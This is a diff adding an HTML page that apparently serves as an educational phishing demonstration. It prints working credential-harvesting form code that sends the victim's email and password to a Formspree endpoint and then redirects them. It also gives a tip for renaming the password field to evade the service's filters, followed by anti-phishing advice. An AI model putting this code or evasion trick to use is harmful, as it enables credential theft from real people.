@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>PhishBait Demo</title>
+        <style>
+            body {
+                background-color: #2d2d2d;
+                color: #f1f1f1;
+                font-family: Arial, Helvetica, sans-serif;
+                margin: 0;
+                padding: 0;
+                user-select: none;
+            }
+
+            .container {
+                max-width: 800px;
+                margin: 0 auto;
+                padding: 2rem;
+            }
+
+            hr {
+                border: none;
+                border-top: 1px solid #555;
+                margin: 1rem 0;
+            }
+
+            p {
+                line-height: 1.6;
+                margin: 1rem 0;
+            }
+
+            a {
+                color: #339dff;
+                text-decoration: none;
+            }
+
+            a:hover {
+                text-decoration: underline;
+            }
+
+            pre {
+                background-color: #1e1e1e;
+                padding: 1rem;
+                border-radius: 8px;
+                overflow-x: auto;
+                user-select: text;
+            }
+
+            code {
+                font-family: "Fira Code", monospace;
+                color: #d63384;
+                font-size: 0.95rem;
+            }
+
+            .warning {
+                font-weight: bold;
+                margin-top: 2rem;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h2>Overview</h2>
+            <hr />
+            <p>
+                Phishing is a form of cyber attack where an attacker
+                impersonates a legitimate entity or website to trick individuals
+                into providing sensitive information, such as login credentials
+                or personal details. This demonstration simulates a basic
+                phishing scenario in which user input is captured through a
+                malicious form.
+            </p>
+
+            <p>
+                This implementation utilizes
+                <a href="https://www.formspree.io" target="_blank" rel="noopener noreferrer">Formspree</a>, a
+                form-handling service that collects submitted form data and
+                sends it to the attacker’s email. While this demonstration is
+                intentionally simple, attackers typically create more
+                sophisticated and convincing websites that mimic legitimate
+                services.
+            </p>
+
+            <h3>How it works</h3>
+            <hr />
+            <p>
+                The page collects input from the user, in this case an email and
+                password.
+            </p>
+            <pre><code>
+&lt;form id="phishy-form" action="&lt;your formspree url&gt;" method="POST"&gt;
+
+    &lt;label&gt;Email:&lt;/label&gt;
+    &lt;input type="email" name="email" required /&gt;
+  
+    &lt;label&gt;Password:&lt;/label&gt;
+    &lt;input type="text" name="userkey" required /&gt;
+  
+    &lt;button id="my-form-button"&gt;Submit&lt;/button&gt;
+&lt;/form&gt;
+
+&lt;script&gt;
+    document
+        .getElementById("phishy-form")
+        .addEventListener("submit", async function (e) {
+        e.preventDefault();
+        let formData = new FormData(this);
+        try {
+            let response = await fetch("&lt;your formspree url&gt;", {
+                method: "POST",
+                body: formData,
+                headers: { Accept: "application/json" },
+            });
+
+            if (response.ok) {
+                window.location.href = "https://www.example.com/";
+            }
+        } catch (error) {
+            console.error("Error: ", error);
+        }
+    });
+&lt;/script&gt;
+    </code></pre>
+
+            <p>
+                Note: The `name` attribute for the password field is set to
+                `userkey`. This avoids detection by Formspree's filters which
+                may block obvious names like `password`. Once the user submits
+                the form, the data is forwarded to the attacker's email, and the
+                victim is redirected to a legitimate-looking page.
+            </p>
+
+            <h3>Try it yourself</h3>
+            <hr />
+            <p>
+                Visit <a href="https://www.formspree.io" target="_blank" rel="noopener noreferrer">Formspree</a> and create a
+                new form endpoint. Replace `&lt;your formspree url&gt;` in the
+                code above with the provided URL. Save the HTML and open it
+                locally. Enter sample credentials (e.g., me@example.com /
+                password123), submit, and check the associated email inbox.
+            </p>
+
+            <h3>Conclusion</h3>
+            <hr />
+            <p>
+                This demonstration is designed to show just how shockingly easy it 
+                can be to launch a phishing attack. With just a few clicks, an 
+                attacker can create a convincing fake login page or spoofed website 
+                to trick users into handing over their credentials.
+            </p>
+            <p>
+                Always double-check URLs before clicking, especially in emails or messages. 
+                Attackers commonly disguise malicious links using URL shorteners, such as 
+                <a href="https://www.bitly.com" target="_blank" rel="noopener noreferrer">bit.ly</a>. 
+                Avoid entering sensitive information on websites unless you're absolutely sure they are legitimate. 
+                To identify a phishing URL, look for HTTPS in the address bar and verify the domain name carefully. 
+                You can also use <a href="https://www.virustotal.com/gui/home/url" target="_blank" rel="noopener noreferrer">VirusTotal</a> 
+                to scan suspicious links. Always double-check domain spelling, as even small differences can indicate a phishing attempt.
+            </p>
+
+            <p class="warning">
+                THIS DEMONSTRATION IS STRICTLY INTENDED FOR EDUCATIONAL PURPOSES
+                ONLY. THE USE OF THIS TECHNIQUE FOR MALICIOUS PURPOSES IS
+                ILLEGAL.
+            </p>
+        </div>
+    </body>
+</html>
